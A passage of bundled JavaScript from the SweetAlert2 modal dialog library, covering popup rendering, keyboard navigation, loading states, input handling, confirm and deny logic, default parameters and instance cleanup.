  show(progressStepsContainer);
  progressStepsContainer.textContent = "";
  if (currentProgressStep >= progressSteps.length) {
    warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
  }
  progressSteps.forEach((step, index) => {
    const stepEl = createStepElement(step);
    progressStepsContainer.appendChild(stepEl);
    if (index === currentProgressStep) {
      addClass(stepEl, swalClasses["active-progress-step"]);
    }
    if (index !== progressSteps.length - 1) {
      const lineEl = createLineElement(params);
      progressStepsContainer.appendChild(lineEl);
    }
  });
};
const createStepElement = (step) => {
  const stepEl = document.createElement("li");
  addClass(stepEl, swalClasses["progress-step"]);
  setInnerHtml(stepEl, step);
  return stepEl;
};
const createLineElement = (params) => {
  const lineEl = document.createElement("li");
  addClass(lineEl, swalClasses["progress-step-line"]);
  if (params.progressStepsDistance) {
    applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
  }
  return lineEl;
};
const renderTitle = (instance, params) => {
  const title = getTitle();
  if (!title) {
    return;
  }
  showWhenInnerHtmlPresent(title);
  toggle$1(title, params.title || params.titleText, "block");
  if (params.title) {
    parseHtmlToContainer(params.title, title);
  }
  if (params.titleText) {
    title.innerText = params.titleText;
  }
  applyCustomClass(title, params, "title");
};
const render = (instance, params) => {
  renderPopup(instance, params);
  renderContainer(instance, params);
  renderProgressSteps(instance, params);
  renderIcon(instance, params);
  renderImage(instance, params);
  renderTitle(instance, params);
  renderCloseButton(instance, params);
  renderContent(instance, params);
  renderActions(instance, params);
  renderFooter(instance, params);
  const popup = getPopup();
  if (typeof params.didRender === "function" && popup) {
    params.didRender(popup);
  }
  globalState.eventEmitter.emit("didRender", popup);
};
const isVisible = () => {
  return isVisible$1(getPopup());
};
const clickConfirm = () => {
  var _dom$getConfirmButton;
  return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
};
const clickDeny = () => {
  var _dom$getDenyButton;
  return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
};
const clickCancel = () => {
  var _dom$getCancelButton;
  return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
};
const DismissReason = Object.freeze({
  cancel: "cancel",
  backdrop: "backdrop",
  close: "close",
  esc: "esc",
  timer: "timer"
});
const removeKeydownHandler = (globalState2) => {
  if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
    globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
      capture: globalState2.keydownListenerCapture
    });
    globalState2.keydownHandlerAdded = false;
  }
};
const addKeydownHandler = (globalState2, innerParams, dismissWith) => {
  removeKeydownHandler(globalState2);
  if (!innerParams.toast) {
    globalState2.keydownHandler = (e2) => keydownHandler(innerParams, e2, dismissWith);
    globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
    globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
    globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
      capture: globalState2.keydownListenerCapture
    });
    globalState2.keydownHandlerAdded = true;
  }
};
const setFocus = (index, increment) => {
  var _dom$getPopup;
  const focusableElements = getFocusableElements();
  if (focusableElements.length) {
    index = index + increment;
    if (index === focusableElements.length) {
      index = 0;
    } else if (index === -1) {
      index = focusableElements.length - 1;
    }
    focusableElements[index].focus();
    return;
  }
  (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
};
const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
const keydownHandler = (innerParams, event, dismissWith) => {
  if (!innerParams) {
    return;
  }
  if (event.isComposing || event.keyCode === 229) {
    return;
  }
  if (innerParams.stopKeydownPropagation) {
    event.stopPropagation();
  }
  if (event.key === "Enter") {
    handleEnter(event, innerParams);
  } else if (event.key === "Tab") {
    handleTab(event);
  } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
    handleArrows(event.key);
  } else if (event.key === "Escape") {
    handleEsc(event, innerParams, dismissWith);
  }
};
const handleEnter = (event, innerParams) => {
  if (!callIfFunction(innerParams.allowEnterKey)) {
    return;
  }
  const input2 = getInput$1(getPopup(), innerParams.input);
  if (event.target && input2 && event.target instanceof HTMLElement && event.target.outerHTML === input2.outerHTML) {
    if (["textarea", "file"].includes(innerParams.input)) {
      return;
    }
    clickConfirm();
    event.preventDefault();
  }
};
const handleTab = (event) => {
  const targetElement = event.target;
  const focusableElements = getFocusableElements();
  let btnIndex = -1;
  for (let i2 = 0; i2 < focusableElements.length; i2++) {
    if (targetElement === focusableElements[i2]) {
      btnIndex = i2;
      break;
    }
  }
  if (!event.shiftKey) {
    setFocus(btnIndex, 1);
  } else {
    setFocus(btnIndex, -1);
  }
  event.stopPropagation();
  event.preventDefault();
};
const handleArrows = (key) => {
  const actions2 = getActions();
  const confirmButton = getConfirmButton();
  const denyButton = getDenyButton();
  const cancelButton = getCancelButton();
  if (!actions2 || !confirmButton || !denyButton || !cancelButton) {
    return;
  }
  const buttons = [confirmButton, denyButton, cancelButton];
  if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
    return;
  }
  const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
  let buttonToFocus = document.activeElement;
  if (!buttonToFocus) {
    return;
  }
  for (let i2 = 0; i2 < actions2.children.length; i2++) {
    buttonToFocus = buttonToFocus[sibling];
    if (!buttonToFocus) {
      return;
    }
    if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
      break;
    }
  }
  if (buttonToFocus instanceof HTMLButtonElement) {
    buttonToFocus.focus();
  }
};
const handleEsc = (event, innerParams, dismissWith) => {
  if (callIfFunction(innerParams.allowEscapeKey)) {
    event.preventDefault();
    dismissWith(DismissReason.esc);
  }
};
var privateMethods = {
  swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
  swalPromiseReject: /* @__PURE__ */ new WeakMap()
};
const setAriaHidden = () => {
  const container = getContainer();
  const bodyChildren = Array.from(document.body.children);
  bodyChildren.forEach((el) => {
    if (el.contains(container)) {
      return;
    }
    if (el.hasAttribute("aria-hidden")) {
      el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
    }
    el.setAttribute("aria-hidden", "true");
  });
};
const unsetAriaHidden = () => {
  const bodyChildren = Array.from(document.body.children);
  bodyChildren.forEach((el) => {
    if (el.hasAttribute("data-previous-aria-hidden")) {
      el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
      el.removeAttribute("data-previous-aria-hidden");
    } else {
      el.removeAttribute("aria-hidden");
    }
  });
};
const isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
const iOSfix = () => {
  if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
    const offset2 = document.body.scrollTop;
    document.body.style.top = `${offset2 * -1}px`;
    addClass(document.body, swalClasses.iosfix);
    lockBodyScroll();
  }
};
const lockBodyScroll = () => {
  const container = getContainer();
  if (!container) {
    return;
  }
  let preventTouchMove;
  container.ontouchstart = (event) => {
    preventTouchMove = shouldPreventTouchMove(event);
  };
  container.ontouchmove = (event) => {
    if (preventTouchMove) {
      event.preventDefault();
      event.stopPropagation();
    }
  };
};
const shouldPreventTouchMove = (event) => {
  const target = event.target;
  const container = getContainer();
  const htmlContainer = getHtmlContainer();
  if (!container || !htmlContainer) {
    return false;
  }
  if (isStylus(event) || isZoom(event)) {
    return false;
  }
  if (target === container) {
    return true;
  }
  if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
  target.tagName !== "TEXTAREA" && // #2266
  !(isScrollable(htmlContainer) && // #1944
  htmlContainer.contains(target))) {
    return true;
  }
  return false;
};
const isStylus = (event) => {
  return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
};
const isZoom = (event) => {
  return event.touches && event.touches.length > 1;
};
const undoIOSfix = () => {
  if (hasClass(document.body, swalClasses.iosfix)) {
    const offset2 = parseInt(document.body.style.top, 10);
    removeClass(document.body, swalClasses.iosfix);
    document.body.style.top = "";
    document.body.scrollTop = offset2 * -1;
  }
};
const measureScrollbar = () => {
  const scrollDiv = document.createElement("div");
  scrollDiv.className = swalClasses["scrollbar-measure"];
  document.body.appendChild(scrollDiv);
  const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
  document.body.removeChild(scrollDiv);
  return scrollbarWidth;
};
let previousBodyPadding = null;
const replaceScrollbarWithPadding = (initialBodyOverflow) => {
  if (previousBodyPadding !== null) {
    return;
  }
  if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
    previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
    document.body.style.paddingRight = `${previousBodyPadding + measureScrollbar()}px`;
  }
};
const undoReplaceScrollbarWithPadding = () => {
  if (previousBodyPadding !== null) {
    document.body.style.paddingRight = `${previousBodyPadding}px`;
    previousBodyPadding = null;
  }
};
function removePopupAndResetState(instance, container, returnFocus, didClose) {
  if (isToast()) {
    triggerDidCloseAndDispose(instance, didClose);
  } else {
    restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
    removeKeydownHandler(globalState);
  }
  if (isSafariOrIOS) {
    container.setAttribute("style", "display:none !important");
    container.removeAttribute("class");
    container.innerHTML = "";
  } else {
    container.remove();
  }
  if (isModal()) {
    undoReplaceScrollbarWithPadding();
    undoIOSfix();
    unsetAriaHidden();
  }
  removeBodyClasses();
}
function removeBodyClasses() {
  removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
}
function close$2(resolveValue) {
  resolveValue = prepareResolveValue(resolveValue);
  const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
  const didClose = triggerClosePopup(this);
  if (this.isAwaitingPromise) {
    if (!resolveValue.isDismissed) {
      handleAwaitingPromise(this);
      swalPromiseResolve(resolveValue);
    }
  } else if (didClose) {
    swalPromiseResolve(resolveValue);
  }
}
const triggerClosePopup = (instance) => {
  const popup = getPopup();
  if (!popup) {
    return false;
  }
  const innerParams = privateProps.innerParams.get(instance);
  if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
    return false;
  }
  removeClass(popup, innerParams.showClass.popup);
  addClass(popup, innerParams.hideClass.popup);
  const backdrop = getContainer();
  removeClass(backdrop, innerParams.showClass.backdrop);
  addClass(backdrop, innerParams.hideClass.backdrop);
  handlePopupAnimation(instance, popup, innerParams);
  return true;
};
function rejectPromise(error2) {
  const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
  handleAwaitingPromise(this);
  if (rejectPromise2) {
    rejectPromise2(error2);
  }
}
const handleAwaitingPromise = (instance) => {
  if (instance.isAwaitingPromise) {
    delete instance.isAwaitingPromise;
    if (!privateProps.innerParams.get(instance)) {
      instance._destroy();
    }
  }
};
const prepareResolveValue = (resolveValue) => {
  if (typeof resolveValue === "undefined") {
    return {
      isConfirmed: false,
      isDenied: false,
      isDismissed: true
    };
  }
  return Object.assign({
    isConfirmed: false,
    isDenied: false,
    isDismissed: false
  }, resolveValue);
};
const handlePopupAnimation = (instance, popup, innerParams) => {
  const container = getContainer();
  const animationIsSupported = hasCssAnimation(popup);
  if (typeof innerParams.willClose === "function") {
    innerParams.willClose(popup);
  }
  globalState.eventEmitter.emit("willClose", popup);
  if (animationIsSupported) {
    animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
  } else {
    removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
  }
};
const animatePopup = (instance, popup, container, returnFocus, didClose) => {
  globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
  const swalCloseAnimationFinished = function(e2) {
    if (e2.target === popup) {
      globalState.swalCloseEventFinishedCallback();
      delete globalState.swalCloseEventFinishedCallback;
      popup.removeEventListener("animationend", swalCloseAnimationFinished);
      popup.removeEventListener("transitionend", swalCloseAnimationFinished);
    }
  };
  popup.addEventListener("animationend", swalCloseAnimationFinished);
  popup.addEventListener("transitionend", swalCloseAnimationFinished);
};
const triggerDidCloseAndDispose = (instance, didClose) => {
  setTimeout(() => {
    if (typeof didClose === "function") {
      didClose.bind(instance.params)();
    }
    globalState.eventEmitter.emit("didClose");
    if (instance._destroy) {
      instance._destroy();
    }
  });
};
const showLoading = (buttonToReplace) => {
  let popup = getPopup();
  if (!popup) {
    new Swal();
  }
  popup = getPopup();
  if (!popup) {
    return;
  }
  const loader = getLoader();
  if (isToast()) {
    hide(getIcon());
  } else {
    replaceButton(popup, buttonToReplace);
  }
  show(loader);
  popup.setAttribute("data-loading", "true");
  popup.setAttribute("aria-busy", "true");
  popup.focus();
};
const replaceButton = (popup, buttonToReplace) => {
  const actions2 = getActions();
  const loader = getLoader();
  if (!actions2 || !loader) {
    return;
  }
  if (!buttonToReplace && isVisible$1(getConfirmButton())) {
    buttonToReplace = getConfirmButton();
  }
  show(actions2);
  if (buttonToReplace) {
    hide(buttonToReplace);
    loader.setAttribute("data-button-to-replace", buttonToReplace.className);
    actions2.insertBefore(loader, buttonToReplace);
  }
  addClass([popup, actions2], swalClasses.loading);
};
const handleInputOptionsAndValue = (instance, params) => {
  if (params.input === "select" || params.input === "radio") {
    handleInputOptions(instance, params);
  } else if (["text", "email", "number", "tel", "textarea"].some((i2) => i2 === params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
    showLoading(getConfirmButton());
    handleInputValue(instance, params);
  }
};
const getInputValue = (instance, innerParams) => {
  const input2 = instance.getInput();
  if (!input2) {
    return null;
  }
  switch (innerParams.input) {
    case "checkbox":
      return getCheckboxValue(input2);
    case "radio":
      return getRadioValue(input2);
    case "file":
      return getFileValue(input2);
    default:
      return innerParams.inputAutoTrim ? input2.value.trim() : input2.value;
  }
};
const getCheckboxValue = (input2) => input2.checked ? 1 : 0;
const getRadioValue = (input2) => input2.checked ? input2.value : null;
const getFileValue = (input2) => input2.files && input2.files.length ? input2.getAttribute("multiple") !== null ? input2.files : input2.files[0] : null;
const handleInputOptions = (instance, params) => {
  const popup = getPopup();
  if (!popup) {
    return;
  }
  const processInputOptions = (inputOptions) => {
    if (params.input === "select") {
      populateSelectOptions(popup, formatInputOptions(inputOptions), params);
    } else if (params.input === "radio") {
      populateRadioOptions(popup, formatInputOptions(inputOptions), params);
    }
  };
  if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
    showLoading(getConfirmButton());
    asPromise(params.inputOptions).then((inputOptions) => {
      instance.hideLoading();
      processInputOptions(inputOptions);
    });
  } else if (typeof params.inputOptions === "object") {
    processInputOptions(params.inputOptions);
  } else {
    error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
  }
};
const handleInputValue = (instance, params) => {
  const input2 = instance.getInput();
  if (!input2) {
    return;
  }
  hide(input2);
  asPromise(params.inputValue).then((inputValue) => {
    input2.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
    show(input2);
    input2.focus();
    instance.hideLoading();
  }).catch((err) => {
    error(`Error in inputValue promise: ${err}`);
    input2.value = "";
    show(input2);
    input2.focus();
    instance.hideLoading();
  });
};
function populateSelectOptions(popup, inputOptions, params) {
  const select = getDirectChildByClass(popup, swalClasses.select);
  if (!select) {
    return;
  }
  const renderOption = (parent, optionLabel, optionValue) => {
    const option = document.createElement("option");
    option.value = optionValue;
    setInnerHtml(option, optionLabel);
    option.selected = isSelected(optionValue, params.inputValue);
    parent.appendChild(option);
  };
  inputOptions.forEach((inputOption) => {
    const optionValue = inputOption[0];
    const optionLabel = inputOption[1];
    if (Array.isArray(optionLabel)) {
      const optgroup = document.createElement("optgroup");
      optgroup.label = optionValue;
      optgroup.disabled = false;
      select.appendChild(optgroup);
      optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
    } else {
      renderOption(select, optionLabel, optionValue);
    }
  });
  select.focus();
}
function populateRadioOptions(popup, inputOptions, params) {
  const radio = getDirectChildByClass(popup, swalClasses.radio);
  if (!radio) {
    return;
  }
  inputOptions.forEach((inputOption) => {
    const radioValue = inputOption[0];
    const radioLabel = inputOption[1];
    const radioInput = document.createElement("input");
    const radioLabelElement = document.createElement("label");
    radioInput.type = "radio";
    radioInput.name = swalClasses.radio;
    radioInput.value = radioValue;
    if (isSelected(radioValue, params.inputValue)) {
      radioInput.checked = true;
    }
    const label = document.createElement("span");
    setInnerHtml(label, radioLabel);
    label.className = swalClasses.label;
    radioLabelElement.appendChild(radioInput);
    radioLabelElement.appendChild(label);
    radio.appendChild(radioLabelElement);
  });
  const radios = radio.querySelectorAll("input");
  if (radios.length) {
    radios[0].focus();
  }
}
const formatInputOptions = (inputOptions) => {
  const result = [];
  if (inputOptions instanceof Map) {
    inputOptions.forEach((value, key) => {
      let valueFormatted = value;
      if (typeof valueFormatted === "object") {
        valueFormatted = formatInputOptions(valueFormatted);
      }
      result.push([key, valueFormatted]);
    });
  } else {
    Object.keys(inputOptions).forEach((key) => {
      let valueFormatted = inputOptions[key];
      if (typeof valueFormatted === "object") {
        valueFormatted = formatInputOptions(valueFormatted);
      }
      result.push([key, valueFormatted]);
    });
  }
  return result;
};
const isSelected = (optionValue, inputValue) => {
  return !!inputValue && inputValue.toString() === optionValue.toString();
};
const handleConfirmButtonClick = (instance) => {
  const innerParams = privateProps.innerParams.get(instance);
  instance.disableButtons();
  if (innerParams.input) {
    handleConfirmOrDenyWithInput(instance, "confirm");
  } else {
    confirm(instance, true);
  }
};
const handleDenyButtonClick = (instance) => {
  const innerParams = privateProps.innerParams.get(instance);
  instance.disableButtons();
  if (innerParams.returnInputValueOnDeny) {
    handleConfirmOrDenyWithInput(instance, "deny");
  } else {
    deny(instance, false);
  }
};
const handleCancelButtonClick = (instance, dismissWith) => {
  instance.disableButtons();
  dismissWith(DismissReason.cancel);
};
const handleConfirmOrDenyWithInput = (instance, type) => {
  const innerParams = privateProps.innerParams.get(instance);
  if (!innerParams.input) {
    error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
    return;
  }
  const input2 = instance.getInput();
  const inputValue = getInputValue(instance, innerParams);
  if (innerParams.inputValidator) {
    handleInputValidator(instance, inputValue, type);
  } else if (input2 && !input2.checkValidity()) {
    instance.enableButtons();
    instance.showValidationMessage(innerParams.validationMessage || input2.validationMessage);
  } else if (type === "deny") {
    deny(instance, inputValue);
  } else {
    confirm(instance, inputValue);
  }
};
const handleInputValidator = (instance, inputValue, type) => {
  const innerParams = privateProps.innerParams.get(instance);
  instance.disableInput();
  const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
  validationPromise.then((validationMessage) => {
    instance.enableButtons();
    instance.enableInput();
    if (validationMessage) {
      instance.showValidationMessage(validationMessage);
    } else if (type === "deny") {
      deny(instance, inputValue);
    } else {
      confirm(instance, inputValue);
    }
  });
};
const deny = (instance, value) => {
  const innerParams = privateProps.innerParams.get(instance || void 0);
  if (innerParams.showLoaderOnDeny) {
    showLoading(getDenyButton());
  }
  if (innerParams.preDeny) {
    instance.isAwaitingPromise = true;
    const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
    preDenyPromise.then((preDenyValue) => {
      if (preDenyValue === false) {
        instance.hideLoading();
        handleAwaitingPromise(instance);
      } else {
        instance.close({
          isDenied: true,
          value: typeof preDenyValue === "undefined" ? value : preDenyValue
        });
      }
    }).catch((error2) => rejectWith(instance || void 0, error2));
  } else {
    instance.close({
      isDenied: true,
      value
    });
  }
};
const succeedWith = (instance, value) => {
  instance.close({
    isConfirmed: true,
    value
  });
};
const rejectWith = (instance, error2) => {
  instance.rejectPromise(error2);
};
const confirm = (instance, value) => {
  const innerParams = privateProps.innerParams.get(instance || void 0);
  if (innerParams.showLoaderOnConfirm) {
    showLoading();
  }
  if (innerParams.preConfirm) {
    instance.resetValidationMessage();
    instance.isAwaitingPromise = true;
    const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
    preConfirmPromise.then((preConfirmValue) => {
      if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
        instance.hideLoading();
        handleAwaitingPromise(instance);
      } else {
        succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
      }
    }).catch((error2) => rejectWith(instance || void 0, error2));
  } else {
    succeedWith(instance, value);
  }
};
function hideLoading() {
  const innerParams = privateProps.innerParams.get(this);
  if (!innerParams) {
    return;
  }
  const domCache = privateProps.domCache.get(this);
  hide(domCache.loader);
  if (isToast()) {
    if (innerParams.icon) {
      show(getIcon());
    }
  } else {
    showRelatedButton(domCache);
  }
  removeClass([domCache.popup, domCache.actions], swalClasses.loading);
  domCache.popup.removeAttribute("aria-busy");
  domCache.popup.removeAttribute("data-loading");
  domCache.confirmButton.disabled = false;
  domCache.denyButton.disabled = false;
  domCache.cancelButton.disabled = false;
}
const showRelatedButton = (domCache) => {
  const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
  if (buttonToReplace.length) {
    show(buttonToReplace[0], "inline-block");
  } else if (allButtonsAreHidden()) {
    hide(domCache.actions);
  }
};
function getInput() {
  const innerParams = privateProps.innerParams.get(this);
  const domCache = privateProps.domCache.get(this);
  if (!domCache) {
    return null;
  }
  return getInput$1(domCache.popup, innerParams.input);
}
function setButtonsDisabled(instance, buttons, disabled) {
  const domCache = privateProps.domCache.get(instance);
  buttons.forEach((button) => {
    domCache[button].disabled = disabled;
  });
}
function setInputDisabled(input2, disabled) {
  const popup = getPopup();
  if (!popup || !input2) {
    return;
  }
  if (input2.type === "radio") {
    const radios = popup.querySelectorAll(`[name="${swalClasses.radio}"]`);
    for (let i2 = 0; i2 < radios.length; i2++) {
      radios[i2].disabled = disabled;
    }
  } else {
    input2.disabled = disabled;
  }
}
function enableButtons() {
  setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
}
function disableButtons() {
  setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
}
function enableInput() {
  setInputDisabled(this.getInput(), false);
}
function disableInput() {
  setInputDisabled(this.getInput(), true);
}
function showValidationMessage(error2) {
  const domCache = privateProps.domCache.get(this);
  const params = privateProps.innerParams.get(this);
  setInnerHtml(domCache.validationMessage, error2);
  domCache.validationMessage.className = swalClasses["validation-message"];
  if (params.customClass && params.customClass.validationMessage) {
    addClass(domCache.validationMessage, params.customClass.validationMessage);
  }
  show(domCache.validationMessage);
  const input2 = this.getInput();
  if (input2) {
    input2.setAttribute("aria-invalid", "true");
    input2.setAttribute("aria-describedby", swalClasses["validation-message"]);
    focusInput(input2);
    addClass(input2, swalClasses.inputerror);
  }
}
function resetValidationMessage() {
  const domCache = privateProps.domCache.get(this);
  if (domCache.validationMessage) {
    hide(domCache.validationMessage);
  }
  const input2 = this.getInput();
  if (input2) {
    input2.removeAttribute("aria-invalid");
    input2.removeAttribute("aria-describedby");
    removeClass(input2, swalClasses.inputerror);
  }
}
const defaultParams = {
  title: "",
  titleText: "",
  text: "",
  html: "",
  footer: "",
  icon: void 0,
  iconColor: void 0,
  iconHtml: void 0,
  template: void 0,
  toast: false,
  animation: true,
  showClass: {
    popup: "swal2-show",
    backdrop: "swal2-backdrop-show",
    icon: "swal2-icon-show"
  },
  hideClass: {
    popup: "swal2-hide",
    backdrop: "swal2-backdrop-hide",
    icon: "swal2-icon-hide"
  },
  customClass: {},
  target: "body",
  color: void 0,
  backdrop: true,
  heightAuto: true,
  allowOutsideClick: true,
  allowEscapeKey: true,
  allowEnterKey: true,
  stopKeydownPropagation: true,
  keydownListenerCapture: false,
  showConfirmButton: true,
  showDenyButton: false,
  showCancelButton: false,
  preConfirm: void 0,
  preDeny: void 0,
  confirmButtonText: "OK",
  confirmButtonAriaLabel: "",
  confirmButtonColor: void 0,
  denyButtonText: "No",
  denyButtonAriaLabel: "",
  denyButtonColor: void 0,
  cancelButtonText: "Cancel",
  cancelButtonAriaLabel: "",
  cancelButtonColor: void 0,
  buttonsStyling: true,
  reverseButtons: false,
  focusConfirm: true,
  focusDeny: false,
  focusCancel: false,
  returnFocus: true,
  showCloseButton: false,
  closeButtonHtml: "&times;",
  closeButtonAriaLabel: "Close this dialog",
  loaderHtml: "",
  showLoaderOnConfirm: false,
  showLoaderOnDeny: false,
  imageUrl: void 0,
  imageWidth: void 0,
  imageHeight: void 0,
  imageAlt: "",
  timer: void 0,
  timerProgressBar: false,
  width: void 0,
  padding: void 0,
  background: void 0,
  input: void 0,
  inputPlaceholder: "",
  inputLabel: "",
  inputValue: "",
  inputOptions: {},
  inputAutoFocus: true,
  inputAutoTrim: true,
  inputAttributes: {},
  inputValidator: void 0,
  returnInputValueOnDeny: false,
  validationMessage: void 0,
  grow: false,
  position: "center",
  progressSteps: [],
  currentProgressStep: void 0,
  progressStepsDistance: void 0,
  willOpen: void 0,
  didOpen: void 0,
  didRender: void 0,
  willClose: void 0,
  didClose: void 0,
  didDestroy: void 0,
  scrollbarPadding: true
};
const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
const deprecatedParams = {
  allowEnterKey: void 0
};
const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
const isValidParameter = (paramName) => {
  return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
};
const isUpdatableParameter = (paramName) => {
  return updatableParams.indexOf(paramName) !== -1;
};
const isDeprecatedParameter = (paramName) => {
  return deprecatedParams[paramName];
};
const checkIfParamIsValid = (param) => {
  if (!isValidParameter(param)) {
    warn(`Unknown parameter "${param}"`);
  }
};
const checkIfToastParamIsValid = (param) => {
  if (toastIncompatibleParams.includes(param)) {
    warn(`The parameter "${param}" is incompatible with toasts`);
  }
};
const checkIfParamIsDeprecated = (param) => {
  const isDeprecated = isDeprecatedParameter(param);
  if (isDeprecated) {
    warnAboutDeprecation(param, isDeprecated);
  }
};
const showWarningsForParams = (params) => {
  if (params.backdrop === false && params.allowOutsideClick) {
    warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
  }
  for (const param in params) {
    checkIfParamIsValid(param);
    if (params.toast) {
      checkIfToastParamIsValid(param);
    }
    checkIfParamIsDeprecated(param);
  }
};
function update(params) {
  const popup = getPopup();
  const innerParams = privateProps.innerParams.get(this);
  if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
    warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
    return;
  }
  const validUpdatableParams = filterValidParams(params);
  const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
  render(this, updatedParams);
  privateProps.innerParams.set(this, updatedParams);
  Object.defineProperties(this, {
    params: {
      value: Object.assign({}, this.params, params),
      writable: false,
      enumerable: true
    }
  });
}
const filterValidParams = (params) => {
  const validUpdatableParams = {};
  Object.keys(params).forEach((param) => {
    if (isUpdatableParameter(param)) {
      validUpdatableParams[param] = params[param];
    } else {
      warn(`Invalid parameter to update: ${param}`);
    }
  });
  return validUpdatableParams;
};
function _destroy() {
  const domCache = privateProps.domCache.get(this);
  const innerParams = privateProps.innerParams.get(this);
  if (!innerParams) {
    disposeWeakMaps(this);
    return;
  }
  if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
    globalState.swalCloseEventFinishedCallback();
    delete globalState.swalCloseEventFinishedCallback;
  }
  if (typeof innerParams.didDestroy === "function") {
    innerParams.didDestroy();
  }
  globalState.eventEmitter.emit("didDestroy");
  disposeSwal(this);
}
const disposeSwal = (instance) => {
  disposeWeakMaps(instance);
  delete instance.params;
  delete globalState.keydownHandler;
  delete globalState.keydownTarget;
  delete globalState.currentInstance;
};
const disposeWeakMaps = (instance) => {
  if (instance.isAwaitingPromise) {
    unsetWeakMaps(privateProps, instance);
    instance.isAwaitingPromise = true;
  } else {
    unsetWeakMaps(privateMethods, instance);
    unsetWeakMaps(privateProps, instance);
    delete instance.isAwaitingPromise;
    delete instance.disableButtons;
    delete instance.enableButtons;
    delete instance.getInput;
    delete instance.disableInput;
    delete instance.enableInput;
    delete instance.hideLoading;
    delete instance.disableLoading;
    delete instance.showValidationMessage;
    delete instance.resetValidationMessage;
    delete instance.close;
    delete instance.closePopup;
    delete instance.closeModal;
    delete instance.closeToast;
    delete instance.rejectPromise;
    delete instance.update;
    delete instance._destroy;
  }
};
const unsetWeakMaps = (obj, instance) => {
  for (const i2 in obj) {
    obj[i2].delete(instance);
  }
};
var instanceMethods = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  _destroy,
  close: close$2,
  closeModal: close$2,
  closePopup: close$2,
  closeToast: close$2,
  disableButtons,
  disableInput,
  disableLoading: hideLoading,
  enableButtons,
  enableInput,
  getInput,
  handleAwaitingPromise,
  hideLoading,
  rejectPromise,
